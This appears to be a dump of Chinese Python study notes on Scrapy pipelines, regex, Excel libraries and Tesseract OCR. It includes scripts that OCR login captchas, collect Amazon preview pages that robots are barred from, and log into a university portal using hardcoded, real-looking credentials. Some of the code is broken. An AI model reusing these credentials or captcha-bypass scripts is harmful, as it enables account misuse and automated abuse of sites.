下载图片和文件\n\nScrapy为下载item中包含的文件（比如在爬取到产品时，同时也想保存对应的图片）提供了一个可重用的item pipelines。这些oipeline 有些共同的方法和结构（我们称之为media pipeline）。一般来说你会使用Files Pipeline或者Images Pipeline。\n\nScrapy内置下载文件方法的好处：\n\n1. 避免重新下载最近已经下载过的文件。\n2. 可以方便的指定文件存储的路径。\n3. 可以将下载的图片转换成通用的格式。比如png或jpg。\n4. 可以方便的生成缩略图。\n5. 可以方便的检测图片的宽和高，确保他们满足最小限制。\n6. 异步下载，效率非常高。\n\n### Files Pipeline\n\n当使用Fi1es Pipeline下载文件的时候，按照以下步骤来完成：\n\n1. 定义好一个Item，然后在这个iten中定义两个属性，分另别为file-urls以及fi1es。file-urls是用来存储需要下载的文件的url链接，需要给一个列表。\n2. 当文件下载完成后，会把文件下载的相关信息存储到item的files属性中。比如下载路径、下载的url和文件的校验码等。\n3. 在配置文件 settings.py 中配置FILES_STORE，这个配置是用来设置文件下载下来的路径。\n4. 启动pipeline：在ITEPLPIPELINES中设置scrapy.pipelines.files.FilesPipeline：1。\n\n### Images Pipeline\n\n当使用Images Pipeline 下载文件的时候，按照以下步疆来完成：\n\n1. 定义好一个Item，然后在这个item中定义两个属性，分别为image_urls以及images。image-urls是用来存储需要下载的图片的url链接，需要给一个列表。\n2. 当文件下载完成后，会把文件下载的相关信息存储到item的images属性中。比如下载路径、下载的url和图片的校验码等。\n3. 在配置文件settings.py 中配置IMAGES_STORE，这个配置是用来设置图片下载下来的路径。\n4. 启动pipeline：在ITEL_PIPELINES 中设置 scrapy.pipelines.images.ImagesPipeline：1\n\n其中ImagePipeline中的file_path方法返回的路径是`'full/%s.jpg' % (image_guid)` , 所以直接使用ImagePipeline， 而不是重写ImagePipeline中的方法，那么下载的图片都会下载到你配置的的IMAGES_STORE目录下的full目录下\n\n### 实现下载图片到本地\n\nitems.py\n\n```python\nclass BmwItem(scrapy.Item):\n    category = scrapy.Field()\n    image_urls = scrapy.Field()\n    images = scrapy.Field()\n```\n\nbwmspilder.py\n\n```python\n# -*- coding: utf-8 -*-\nimport scrapy\nfrom bmw.items import BmwItem\n\nclass Bmw5Spider(scrapy.Spider):\n    name = 'bmw5'\n    allowed_domains = ['car.autohome.com.cn']\n    start_urls = ['https://car.autohome.com.cn/pic/series/65.html']\n\n    def parse(self, response):\n        uiboxs = response.xpath(\"//div[@class='uibox']\")[1:]\n        for uibox in uiboxs:\n            category = uibox.xpath(\".//div[@class='uibox-title']/a/text()\").get()\n            urls = uibox.xpath(\".//ul/li/a/img/@src\").getall()\n            urls = list(map(lambda x:response.urljoin(x),urls))\n            item = BmwItem(partname=partname,urls=urls)\n            yield item\n```\n\npipeline.py\n\n```python\nclass BMWImagePipeline(ImagePipeline):\n    # item参数是爬取生成的item对象,从中提取url字段,然后加入到调用队列中,等待下载。\n    # 所以方法是在发送下载请求之前调用的，用来搜集下载链接\n    def get_media_requests(self, item, info):\n        request_objs = super(BWMImagesPipeline, self).get_media_requests(item, info)\n        for request_obj in request_objs:\n            request_obj.item = item\n        return request_objs\n    \n    # request表示当前下载对应的request对象(request.__dict__查看属性),该方法用来保存文件名\n    # 者个方法是在图片要被存储的时候调用，来获取这个图片存储的路径\n    def file_path(self, request, response=None, info=None):\n        path = super(BMWImagesPipeline, self).file_path(request, response, info)\n        category = request.item.get('category')\n        category_path = os.path.join(images_store, category)\n        if not os.path.exists(category_path):\n            os.mkdir(category_path)\n        image_name = path.replace(\"full/\", \"\")\n        image_path = os.path.join(category_path, image_name)\n        return image_path\n```\n\nsetting.py\n\n```python\nITEM_PIPELINES={\n    'bmw.pipelines.BMWImagesPipeline':1\n}\n```\n\n# 动态获取验证码方法\n如果一个验证码是有由于一个动态链接生成的。 因为验证码是由动态链接生成的，所以你获取这个验证码时只能通过想找个动态链接发起请求才能获取到， 但是如果你向这个动态链接发送请求时， 返回给你的又是另一个随机生成的验证码，与你登录页面的不一样。  为了解决这个问题， 就必须要借助Cookie。\n首先你先请求登录页面时， 这个服务器会向你返回Cookie,  获取这个Cookie,  然后带着这个Cookie去获取请求验证码的url， 获取验证码， 然后登录即可\n案例如下：\n```python\n# -*- coding: utf-8 -*-\nimport scrapy\nfrom PIL import Image\nfrom urllib import request\n\n\nclass WeiboLoginSpider(scrapy.Spider):\n\tname = 'weibo_login'\n\tallowed_domains = []\n\tstart_urls = [\"http://kdjw.hnust.edu.cn:8080/kdjw/\"]\n\tlogin_url = \"http://kdjw.hnust.edu.cn:8080/kdjw/Logon.do?method=logon\"\n\tcaptcha_url = \"http://kdjw.hnust.edu.cn:8080/kdjw/verifycode.servlet\"\n\n\tdef start_requests(self):\n\t\treturn [scrapy.Request(\"http://kdjw.hnust.edu.cn:8080/kdjw/\", callback=self.get_captcha_cookies)]\n\n\tdef get_captcha_cookies(self, response):\n\t\tcookies_str = response.headers.get(\"Set-Cookie\")\n\t\tcookies = {\"Cookie\": cookies_str}\n\t\treturn [scrapy.Request(url=self.captcha_url, cookies=cookies, callback=self.parse_login)]\n\n\tdef parse_login(self, response):\n\t\tcookies_str = response.headers.get(\"Set-Cookie\")\n\t\tcookies = {\"Cookie\": cookies_str}\n\t\twith open(\"fff.jpg\", \"wb\") as fp:\n\t\t\tfp.write(response.body)\n\t\t\tfp.close()\n\t\timage = Image.open('fff.jpg')\n\t\timage.show()\n\t\tcaptcha = input(\"Please input the captcha\")\n\t\tdata1 = {\n\t\t\t\"USERNAME\": \"1705050109\",\n\t\t\t\"PASSWORD\": \"037031\",\n\t\t\t\"RANDOMCODE\": captcha,\n\t\t\t\"useDogCode\": \"\",\n\t\t\t\"x\": '0',\n\t\t\t\"y\": '0',\n\t\t\t\"dlfl\": \"0\"\n\t\t}\n\t\treturn [scrapy.FormRequest(url=self.login_url, cookies=cookies, formdata=data1, callback=self.parse_main,\n\t\t\t\t\t\t\t\t   dont_filter=True)]\n\n\tdef parse_main(self, response):\n\t\tprint(response.text)\n\t\tprint(response.url)\n```\n"
  },
  {
    "title": "./notes/python库/re.md",
    "body": "# 简介\n在 Python 中，我们可以使用内置的re模块来使用正则表达式。\n\n有一点需要特别注意的是，正则表达式使用 对特殊字符进行转义，所以如果我们要使用原始字符串，只需加一个 r 前缀，示例：\n```python\nr'chuanzhiboke\\t\\.\\tpython'\n```\n\n**re 模块的一般使用步骤如下：**\n1. 使用 `compile()` 函数将正则表达式的字符串形式编译为一个 `Pattern` 对象\n2. 通过 `Pattern` 对象提供的一系列方法对文本进行匹配查找，获得匹配结果，一个 Match 对象。\n3. 最后使用 `Match` 对象提供的属性和方法获得信息，根据需要进行其他的操作\n\n# compile 函数\ncompile 函数用于编译正则表达式，生成一个 Pattern 对象，它的一般使用形式如下：\n```python\nimport re\n\n# 将正则表达式编译成 Pattern 对象\npattern = re.compile(r'\\d+')\n```\n\n在上面，我们已将一个正则表达式编译成 Pattern 对象，接下来，我们就可以利用 pattern 的一系列方法对文本进行匹配查找了。\n\nPattern 对象的一些常用方法主要有：\n- match 方法：从起始位置开始查找，一次匹配\n- search 方法：从任何位置开始查找，一次匹配\n- findall 方法：全部匹配，返回列表\n- finditer 方法：全部匹配，返回迭代器\n- split 方法：分割字符串，返回列表\n- sub 方法：替换\n\n# match 方法\nmatch 方法用于查找字符串的头部（也可以指定起始位置），它是一次匹配，只要找到了一个匹配的结果就返回，而不是查找所有匹配的结果。它的一般使用形式如下：\n```\nmatch(string[, pos[, endpos]])\n```\n其中，string 是待匹配的字符串，pos 和 endpos 是可选参数，指定字符串的起始和终点位置，默认值分别是 0 和 len (字符串长度)。因此，当你不指定 pos 和 endpos 时，match 方法默认匹配字符串的头部。\n\n当匹配成功时，返回一个 Match 对象，如果没有匹配上，则返回 None。\n```python\n>>> import re\n>>> pattern = re.compile(r'\\d+')  # 用于匹配至少一个数字\n\n>>> m = pattern.match('one12twothree34four')  # 查找头部，没有匹配\n>>> print m\nNone\n\n>>> m = pattern.match('one12twothree34four', 2, 10) # 从'e'的位置开始匹配，没有匹配\n>>> print m\nNone\n\n>>> m = pattern.match('one12twothree34four', 3, 10) # 从'1'的位置开始匹配，正好匹配\n>>> print m                                         # 返回一个 Match 对象\n<_sre.SRE_Match object at 0x10a42aac0>\n\n>>> m.group(0)   # 可省略 0\n'12'\n>>> m.start(0)   # 可省略 0\n3\n>>> m.end(0)     # 可省略 0\n5\n>>> m.span(0)    # 可省略 0\n(3, 5)\n```\n\n在上面，当匹配成功时返回一个 Match 对象，其中：\n- group([group1, …]) 方法用于获得一个或多个分组匹配的字符串，当要获得整个匹配的子串时，可直接使用 group() 或 group(0)；\n- `start([group])` 方法用于获取分组匹配的子串在整个字符串中的起始位置（子串第一个字符的索引），参数默认值为 0；\n- `end([group])`方法用于获取分组匹配的子串在整个字符串中的结束位置（子串最后一个字符的索引+1），参数默认值为 0；\n- `span([group])`方法返回 (start(group), end(group))。\n\n再看看一个例子：\n```python\n>>> import re\n>>> pattern = re.compile(r'([a-z]+) ([a-z]+)', re.I)  # re.I 表示忽略大小写\n>>> m = pattern.match('Hello World Wide Web')\n\n>>> print m     # 匹配成功，返回一个 Match 对象\n<_sre.SRE_Match object at 0x10bea83e8>\n\n>>> m.group(0)  # 返回匹配成功的整个子串\n'Hello World'\n\n>>> m.span(0)   # 返回匹配成功的整个子串的索引\n(0, 11)\n\n>>> m.group(1)  # 返回第一个分组匹配成功的子串\n'Hello'\n\n>>> m.span(1)   # 返回第一个分组匹配成功的子串的索引\n(0, 5)\n\n>>> m.group(2)  # 返回第二个分组匹配成功的子串\n'World'\n\n>>> m.span(2)   # 返回第二个分组匹配成功的子串\n(6, 11)\n\n>>> m.groups()  # 等价于 (m.group(1), m.group(2), ...)\n('Hello', 'World')\n\n>>> m.group(3)   # 不存在第三个分组\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\nIndexError: no such group\n```\n\n# search 方法\nsearch 方法用于查找字符串的任何位置，它也是一次匹配，只要找到了一个匹配的结果就返回，而不是查找所有匹配的结果，它的一般使用形式如下：\n```\nsearch(string[, pos[, endpos]])\n```\n其中，string 是待匹配的字符串，pos 和 endpos 是可选参数，指定字符串的起始和终点位置，默认值分别是 0 和 len (字符串长度)。\n当匹配成功时，返回一个 Match 对象，如果没有匹配上，则返回 None。\n让我们看看例子：\n```python\n>>> import re\n>>> pattern = re.compile('\\d+')\n>>> m = pattern.search('one12twothree34four')  # 这里如果使用 match 方法则不匹配\n>>> m\n<_sre.SRE_Match object at 0x10cc03ac0>\n>>> m.group()\n'12'\n>>> m = pattern.search('one12twothree34four', 10, 30)  # 指定字符串区间\n>>> m\n<_sre.SRE_Match object at 0x10cc03b28>\n>>> m.group()\n'34'\n>>> m.span()\n(13, 15)\n```\n\n再来看一个例子：\n```python\n# -*- coding: utf-8 -*-\n\nimport re\n# 将正则表达式编译成 Pattern 对象\npattern = re.compile(r'\\d+')\n# 使用 search() 查找匹配的子串，不存在匹配的子串时将返回 None\n# 这里使用 match() 无法成功匹配\nm = pattern.search('hello 123456 789')\nif m:\n    # 使用 Match 获得分组信息\n    print 'matching string:',m.group()\n    # 起始位置和结束位置\n    print 'position:',m.span()\n```\n执行结果：\n```\nmatching string: 123456\nposition: (6, 12)\n```\n\n# findall 方法\n上面的 match 和 search 方法都是一次匹配，只要找到了一个匹配的结果就返回。然而，在大多数时候，我们需要搜索整个字符串，获得所有匹配的结果。\nfindall 方法的使用形式如下：\n```\nfindall(string[, pos[, endpos]])\n```\n其中，string 是待匹配的字符串，pos 和 endpos 是可选参数，指定字符串的起始和终点位置，默认值分别是 0 和 len (字符串长度)。\nfindall 以列表形式返回全部能匹配的子串，如果没有匹配，则返回一个空列表。\n看看例子：\n```python\nimport re\npattern = re.compile(r'\\d+')   # 查找数字\n\nresult1 = pattern.findall('hello 123456 789')\nresult2 = pattern.findall('one1two2three3four4', 0, 10)\n\nprint result1\nprint result2\n```\n执行结果：\n```\n['123456', '789']\n['1', '2']\n```\n\n# finditer 方法\nfinditer 方法的行为跟 findall 的行为类似，也是搜索整个字符串，获得所有匹配的结果。但它返回一个顺序访问每一个匹配结果（Match 对象）的迭代器。\n\n看看例子：\n```python\n# -*- coding: utf-8 -*-\n\nimport re\npattern = re.compile(r'\\d+')\n\nresult_iter1 = pattern.finditer('hello 123456 789')\nresult_iter2 = pattern.finditer('one1two2three3four4', 0, 10)\n\nprint type(result_iter1)\nprint type(result_iter2)\n\nprint 'result1...'\nfor m1 in result_iter1:   # m1 是 Match 对象\n    print 'matching string: {}, position: {}'.format(m1.group(), m1.span())\n\nprint 'result2...'\nfor m2 in result_iter2:\n    print 'matching string: {}, position: {}'.format(m2.group(), m2.span())\n```\n\n执行结果：\n```\n<type 'callable-iterator'>\n<type 'callable-iterator'>\nresult1...\nmatching string: 123456, position: (6, 12)\nmatching string: 789, position: (13, 16)\nresult2...\nmatching string: 1, position: (3, 4)\nmatching string: 2, position: (7, 8)\n```\n\n# split 方法\nsplit 方法按照能够匹配的子串将字符串分割后返回列表，它的使用形式如下：\n```\nsplit(string[, maxsplit])\n```\n其中，maxsplit 用于指定最大分割次数，不指定将全部分割。\n看看例子：\n```python\nimport re\np = re.compile(r'[\\s\\,\\;]+')\nprint p.split('a,b;; c   d')\n```\n执行结果：\n```\n['a', 'b', 'c', 'd']\n```\n\n# sub 方法\nsub 方法用于替换。它的使用形式如下：\n```\nsub(repl, string[, count])\n```\n其中，repl 可以是字符串也可以是一个函数：\n- 如果 repl 是字符串，则会使用 repl 去替换字符串每一个匹配的子串，并返回替换后的字符串，另外，repl 还可以使用 id 的形式来引用分组，但不能使用编号 0；\n- 如果 repl 是函数，这个方法应当只接受一个参数（Match 对象），并返回一个字符串用于替换（返回的字符串中不能再引用分组）。\n- count 用于指定最多替换次数，不指定时全部替换。\n\n看看例子：\n```python\nimport re\np = re.compile(r'(\\w+) (\\w+)') # \\w = [A-Za-z0-9_]\ns = 'hello 123, hello 456'\n\nprint p.sub(r'hello world', s)  # 使用 'hello world' 替换 'hello 123' 和 'hello 456'\nprint p.sub(r'\\2 \\1', s)        # 引用分组\n\ndef func(m):\n    return 'hi' + ' ' + m.group(2)\n\nprint p.sub(func, s)\nprint p.sub(func, s, 1)         # 最多替换一次\n```\n\n执行结果：\n```\nhello world, hello world\n123 hello, 456 hello\nhi 123, hi 456\nhi 123, hello 456\n```\n\n# 匹配中文\n在某些情况下，我们想匹配文本中的汉字，有一点需要注意的是，中文的 unicode 编码范围 主要在`[u4e00-u9fa5]`，这里说主要是因为这个范围并不完整，比如没有包括全角（中文）标点，不过，在大部分情况下，应该是够用的。\n\n假设现在想把字符串 title = u'你好，hello，世界' 中的中文提取出来，可以这么做：\n```python\nimport re\n\ntitle = u'你好，hello，世界'\npattern = re.compile(ur'[\\u4e00-\\u9fa5]+')\nresult = pattern.findall(title)\n\nprint result\n```\n注意到，我们在正则表达式前面加上了两个前缀 ur，其中 r 表示使用原始字符串，u 表示是 unicode 字符串。\n\n执行结果:\n```\n[u'\\u4f60\\u597d', u'\\u4e16\\u754c']\n```\n\n# 贪婪模式与非贪婪模式\n1. 贪婪模式：在整个表达式匹配成功的前提下，尽可能多的匹配 ( * )；\n2. 非贪婪模式：在整个表达式匹配成功的前提下，尽可能少的匹配 ( ? )；\n3. **Python里数量词默认是贪婪的。**"
  },
  {
    "title": "./notes/python库/xlrd与xlwt.md",
    "body": "我们可以使用xlrd与xlwt模块来操作excel文件\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20210620140210.png\" width=\"500px\"/>\n\n使用xlrd时，不能修改excel内容\n使用xlwt时，不能读取excel内容\n\n**xlrd与xlwt中行与列都是从0开始**\n\n具体操作过程如下：\n# Python读取Excel文件数据。\n有如下excel文件：\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20210617105220.png\" width=\"700px\"/>\n\n\n打开PyCharm,，创建python file ,写入以下代码\n```py\n#读取xls文件,一定要把xlsx后缀改成xls\nimport xlrd\nfile_name = xlrd.open_workbook('G:\\\\info.xls', formatting_info=True)#得到文件\n# 设置 formatting_info=True ，当打开表格是保存表格原有的样式(包括单元格背景颜色)，进行保存时，\ntable =file_name.sheets()[0]#得到sheet页\nnrows = table.nrows #总行数\nncols = table.ncols #总列数\ni = 0\nwhile i < nrows:\n    cell = table.row_values(i)[1] #得到数字列数据\n    ctype = table.cell(i, 1).ctype #得到数字列数据的格式\n    username=table.row_values(i)[0]\n    if ctype == 2 and cell % 1 == 0: #判断是否是纯数字\n     password= int(cell)  #是纯数字就转化位int类型\n     print('用户名：%s'%username,'密码：%s'%password)\n    i=i+1\n```\n\n运行后的结果如下\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20210617105308.png\" width=\"700px\"/>\n\n# python写入Excel文件数据。\n打开PyCharm,，创建python file ,写入以下代码\n```py\nimport random\nimport string\nimport csv\nimport xlrd\nimport xlwt\n#注意这里的 excel 文件的后缀是 xls 如果是 xlsx 打开是会提示无效,新建excel表格后要选择文本格式保存\nall_str = string.ascii_letters + string.digits\nexcelpath =('G:\\\\user.xls')  #新建excel文件\nworkbook = xlwt.Workbook(encoding='utf-8')  #写入excel文件\nsheet = workbook.add_sheet('Sheet1',cell_overwrite_ok=True)  #新增一个sheet工作表\nheadlist=[u'账号',u'密码',u'邮箱']   #写入数据头\nrow=0\ncol=0\nfor head in headlist:\n    sheet.write(row,col,head)\n    col=col+1\nfor i in range(1,4):#写入3行数据\n    for j in range(1,3):#写入3列数据\n        username = ''.join(random.sample(all_str, 5))+'#$%'\n        # password = random.randint(100000, 999999) 生成随机数\n        password= ''.join(random.sample(['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'z', 'y', 'x', 'w)', 'v', 'u', 't', 's', 'r', 'q', 'p', 'o',\n            'n', 'm', 'l', 'k', 'j', 'i', 'h', 'g', 'f', 'e', 'd', 'c', 'b', 'a'],8))\n        Email=''.join(random.sample(all_str, 5))+'@163.com'\n        sheet.write(i,j-1,username)\n        sheet.write(i,j,password)\n        sheet.write(i,j,Email)\n        # sheet.write(i-1, j-1, username)   没有写标题时数据从第一行开始写入\n        # sheet.write(i-1, j, password)\n    workbook.save(excelpath) #保存\n    print(u\"生成第[%d]个账号\"%(i))\n```\n（2）运行后的结果如下\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20210617105350.png\" width=\"700px\"/>\n\n生成Excel文件\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20210617105404.png\" width=\"700px\"/>\n\n# flask读取excel且修改excel\n```py\nimport xlrd\nimport xlwt\nfrom xlutils.copy import copy\nimport io\nfrom flask import request, Response, make_response, jsonify\n\n@app.route(\"/price_excel/import\", methods=['POST', 'GET'])\ndef import_excel():\n    # 读取传来的excel文件\n\tfile = request.files['file']\n\tf = file.read()\n\n    # 通过xlrd通过excel内容来获取excel。在然后通过copy()来转换成xlwt形式，不直接使用xlwt构建excel的原因是xlwt不支持直接通过excel文件内容来构建excel\n\toldWb = xlrd.open_workbook(file_contents=f, formatting_info=True)\n\toldws = oldWb.sheets()[0]\n\n    # 将xlrd获取到的内容转换成xlwt，然后对excel镜像修改\n\tnewWb = copy(oldWb) \n\tnewWs = newWb.get_sheet(0) \n\n    # 对excel进行修改\n    ... \n\n    # 将修改后的excel转换为字节流\n\toutput = io.BytesIO()\n\tnewWb.save(output)\n\tresponse = make_response(output.getvalue())\n\n\tresponse.headers[\"Content-Type\"] = \"application/octet-stream; charset=UTF-8\"\n\tresponse.headers[\"Content-Disposition\"] = \"attachment; filename={}\".format(\"export.xls\")\n\treturn response\n```\n"
  },
  {
    "title": "./notes/python库/pytesseract.md",
    "body": "# Tesseract\nTesseract 是一个 OCR(光学文字识别(Optical Character Recognition, OCR))库,目前由 Google 赞助(Google 也是一家以 OCR 和机器学习技术闻名于世的公司)。Tesseract 是目前公认最优秀、最精确的开源 OCR 系统，除了极高的精确度，Tesseract 也具有很高的灵活性。它可以通过训练识别出任何字体，也可以识别出任何 Unicode 字符。\n\n**安装Tesseract**\nWindows 系统\n下载可执行安装文件：https://code.google.com/p/tesseract-ocr/downloads/list 安装。\n\nUbuntu Linux系统\n可以通过 apt-get 安装: `$sudo apt-get tesseract-ocr`\n\nMac OS X系统\n用 [Homebrew](http://brew.sh/)可以很方便地安装： `brew install tesseract`\n\n要使用 Tesseract 的功能，比如后面的示例中训练程序识别字母，要先在系统中设置一 个新的环境变量 `$TESSDATA_PREFIX`，让 Tesseract 知道训练的数据文件存储在哪里，然后搞一份tessdata数据文件，放到Tesseract目录下。\n\n- 在大多数 Linux 系统和 Mac OS X 系统上,你可以这么设置（假设Tesseract数据文件目录在/usr/local/share/下）: **$export TESSDATA_PREFIX=/usr/local/share/Tesseract**\n- 在 Windows 系统上也类似,你可以通过下面这行命令设置环境变量: **#setx TESSDATA_PREFIX C:\\Program Files\\Tesseract OCR\\Tesseract**\n\n**安装pytesseract**\nTesseract 是一个命令行工具，安装之后，要用 tesseract 命令在 Python 的外面运行，但我们可以通过 pip 安装支持 Python 版本的 Tesseractj与PIL库：[pytesseract](https://pypi.python.org/pypi/pytesseract)\n```shell\npip install pytesseract\npip install Pillow\n```\n\n# 命令行中用tesseract识别图像\n处理的大多数文字最好都是比较干净、格式规范的。格式规范的文字通常可以满足一些需求，通常格式规范的文字具有以下特点:\n- 使用一个标准字体(不包含手写体、草书,或者十分“花哨的”字体)\n- 即使被复印或拍照，字体还是很清晰，没有多余的痕迹或污点\n- 排列整齐，没有歪歪斜斜的字\n- 没有超出图片范围，也没有残缺不全，或紧紧贴在图片的边缘\n文字的一些格式问题在图片预处理时可以进行解决。例如,可以把图片转换成灰度图，调整亮度和对比度，还可以根据需要进行裁剪和旋转（详情需要了解图像与信号处理）等。\n\n通过下面的命令运行 Tesseract，读取文件并把结果写到一个文本文件中: `tesseract test.jpg text`\n`cat text.txt` 即可显示结果。\n\n识别结果很准确,不过符号`^`和`*`分别被表示成了双引号和单引号。大体上可以让你很舒服地阅读。\n\n查看tesseract可以使用的语言有哪些，并且指定使用某种语言\n![](https://gitee.com/naiswang/images/raw/master/20190922163921.png)\n![](https://gitee.com/naiswang/images/raw/master/20190922164001.png)\n\n给tesseracat添加另一种语言集，在https://github.com/tesseract-ocr/tessdata 上选择一个要添加的语言训练集，然后放到 `E:\\tesseract-ocr\\tessdata` 目录下即可\n\n# 通过Python代码实现\n```python\nimport pytesseract\nfrom PIL import Image\n\n# 只当tesseract.exe所在路径\npytesseract.pytesseract.tesseract_cmd = r\"F:\\tesseract.exe\"\n\nimage = Image.open('test.jpg')\ntext = pytesseract.image_to_string(image, lang='eng')\nprint text\n```\n\n运行结果：\n```\nThis is some text, written in Arial, that will be read by\nTesseract. Here are some symbols: !@#$%\"&*()\n```\n\n# 对图片进行阈值过滤和降噪处理\n很多时候我们在网上会看到这样的图片：\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20210605151248.png\" width=\"700px\"/>\nTesseract 不能完整处理这个图片,主要是因为图片背景色是渐变的,最终结果是这样:\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20210605151321.png\" width=\"700px\"/>\n\n随着背景色从左到右不断加深,文字变得越来越难以识别,Tesseract 识别出的 每一行的最后几个字符都是错的。\n\n遇到这类问题,可以先用 Python 脚本对图片进行清理。利用 PIL 库,我们可以创建一个阈值过滤器来去掉渐变的背景色，只把文字留下来，从而让图片更加清晰，便于 Tesseract 读取:\n```python\nfrom PIL import Image \nimport subprocess\n\ndef cleanFile(filePath, newFilePath): \n    image = Image.open(filePath)\n\n    # 对图片进行阈值过滤（低于143的置为黑色，否则为白色）\n    image = image.point(lambda x: 0 if x < 143 else 255)\n    # 重新保存图片\n    image.save(newFilePath)\n\n    # 调用系统的tesseract命令对图片进行OCR识别 \n    subprocess.call([\"tesseract\", newFilePath, \"output\"])\n\n    # 打开文件读取结果\n    with open(\"output.txt\", 'r') as f:\n        print(f.read()) \n\nif __name__ == \"__main__\":\n    cleanFile(\"text2.png\", \"text2clean.png\")\n```\n\n通过一个阈值对前面的“模糊”图片进行过滤的结果\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20210605151332.png\" width=\"700px\"/>\n\n除了一些标点符号不太清晰或丢失了,大部分文字都被读出来了。Tesseract 给出了最好的 结果:\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20210605151403.png\" width=\"700px\"/>\n\n# 从网站图片中抓取文字\n用 Tesseract 读取硬盘里图片上的文字,可能不怎么令人兴奋,但当我们把它和网络爬虫组合使用时,就能成为一个强大的工具。\n\n网站上的图片可能并不是故意把文字做得很花哨 (就像餐馆菜单的 JPG 图片上的艺术字),但它们上面的文字对网络爬虫来说就是隐藏起来 了，举个例子：\n\n- 虽然亚马逊的 robots.txt 文件允许抓取网站的产品页面,但是图书的预览页通常不让网络机器人采集。\n- 图书的预览页是通过用户触发 Ajax 脚本进行加载的,预览图片隐藏在 div 节点 下面;其实,普通的访问者会觉得它们看起来更像是一个 Flash 动画,而不是一个图片文 件。当然,即使我们能获得图片,要把它们读成文字也没那么简单。\n- 下面的程序就解决了这个问题:首先导航到托尔斯泰的《战争与和平》的大字号印刷版 1, 打开阅读器,收集图片的 URL 链接,然后下载图片,识别图片,最后打印每个图片的文 字。因为这个程序很复杂,利用了前面几章的多个程序片段,所以我增加了一些注释以让 每段代码的目的更加清晰:\n```python\nimport time\nfrom urllib.request import urlretrieve \nimport subprocess\nfrom selenium import webdriver\n#创建新的Selenium driver\ndriver = webdriver.PhantomJS()\n\n# 用Selenium试试Firefox浏览器:\n# driver = webdriver.Firefox()\n\ndriver.get(\"http://www.amazon.com/War-Peace-Leo-Nikolayevich-Tolstoy/dp/1427030200\")\n# 单击图书预览按钮 driver.find_element_by_id(\"sitbLogoImg\").click() imageList = set()\n# 等待页面加载完成\ntime.sleep(5)\n# 当向右箭头可以点击时,开始翻页\nwhile \"pointer\" in driver.find_element_by_id(\"sitbReaderRightPageTurner\").get_attribute(\"style\"):\n    driver.find_element_by_id(\"sitbReaderRightPageTurner\").click()\n    time.sleep(2)\n    # 获取已加载的新页面(一次可以加载多个页面,但是重复的页面不能加载到集合中) \n    pages = driver.find_elements_by_xpath(\"//div[@class='pageImage']/div/img\") \n    for page in pages:\n        image = page.get_attribute(\"src\")\n        imageList.add(image)\ndriver.quit()\n\n# 用Tesseract处理我们收集的图片URL链接 \nfor image in sorted(imageList):\n    # 保存图片\n    urlretrieve(image, \"page.jpg\")\n    p = subprocess.Popen([\"tesseract\", \"page.jpg\", \"page\"], stdout=subprocess.PIPE,stderr=subprocess.PIPE)\n    f = open(\"page.txt\", \"r\")\n    p.wait() print(f.read())\n```\n\n和我们前面使用 Tesseract 读取的效果一样，这个程序也会完美地打印书中很多长长的段落，第六页的预览如下所示:\n```\n6\n     \"A word of friendly advice, mon\n     cher. Be off as soon as you can,\n     that's all I have to tell you. Happy\n     he who has ears to hear. Good-by,\n     my dear fellow. Oh, by the by!\" he\n     shouted through the doorway after\n     Pierre, \"is it true that the countess\n     has fallen into the clutches of the\n     holy fathers of the Society of je-\n     sus?\"\n\n     Pierre did not answer and left Ros-\n     topchin's room more sullen and an-\n     gry than he had ever before shown\n     himself.\n```\n但是当文字出现在彩色封面上时，结果就不那么完美了:\n```\n   WEI' nrrd Peace\n   Len Nlkelayevldu Iolfluy\n   Readmg shmdd be ax\n   wlnvame asnossxble Wenfler\n   an mm m our cram: Llhvary\n    - Leo Tmsloy was a Russian rwovelwst\n    I and moval phflmopher med lur\n    A ms Ideas 01 nonviolenx reswslance m 5 We range     0, \"and\"\n```\n\n如果想把文字加工成普通人可以看懂的效果，还需要花很多时间去处理。\n比如，通过给 Tesseract 提供大量已知的文字与图片映射集，经过训练 Tesseract 就可以“学会”识别同一种字体，而且可以达到极高的精确率和准确率，甚至可以忽略图片中文字的背景色和相对位置等问题。\n\n# 尝试对知乎网验证码进行处理：\n许多流行的内容管理系统即使加了验证码模块，其众所周知的注册页面也经常会遭到网络 机器人的垃圾注册。\n那么，这些网络机器人究，竟是怎么做的呢?既然我们已经，可以成功地识别出保存在电脑上 的验证码了，那么如何才能实现一个全能的网络机器人呢?\n大多数网站生成的验证码图片都具有以下属性。\n- 它们是服务器端的程序动态生成的图片。验证码图片的 src 属性可能和普通图片不太一 样，比如 `<img src=\"WebForm.aspx?id=8AP85CQKE9TJ\">`，但是可以和其他图片一样进行 下载和处理。\n- 图片的答案存储在服务器端的数据库里。\n- 很多验证码都有时间限制，如果你太长时间没解决就会失效。\n- 常用的处理方法就是，首先把验证码图片下载到硬盘里，清理干净，然后用 Tesseract 处理 图片，最后返回符合网站要求的识别结果。\n```python\nimport requests\nimport time\nimport pytesseract\nfrom PIL import Image\nfrom bs4 import BeautifulSoup\n\ndef captcha(data):\n    with open('captcha.jpg','wb') as fp:\n        fp.write(data)\n    time.sleep(1)\n    image = Image.open(\"captcha.jpg\")\n    text = pytesseract.image_to_string(image)\n    print \"机器识别后的验证码为：\" + text\n    command = raw_input(\"请输入Y表示同意使用，按其他键自行重新输入：\")\n    if (command == \"Y\" or command == \"y\"):\n        return text\n    else:\n        return raw_input('输入验证码：')\n\ndef zhihuLogin(username,password):\n\n    # 构建一个保存Cookie值的session对象\n    sessiona = requests.Session()\n    headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'}\n\n    # 先获取页面信息，找到需要POST的数据（并且已记录当前页面的Cookie）\n    html = sessiona.get('https://www.zhihu.com/#signin', headers=headers).content\n\n    # 找到 name 属性值为 _xsrf 的input标签，取出value里的值\n    _xsrf = BeautifulSoup(html ,'lxml').find('input', attrs={'name':'_xsrf'}).get('value')\n\n    # 取出验证码，r后面的值是Unix时间戳,time.time()\n    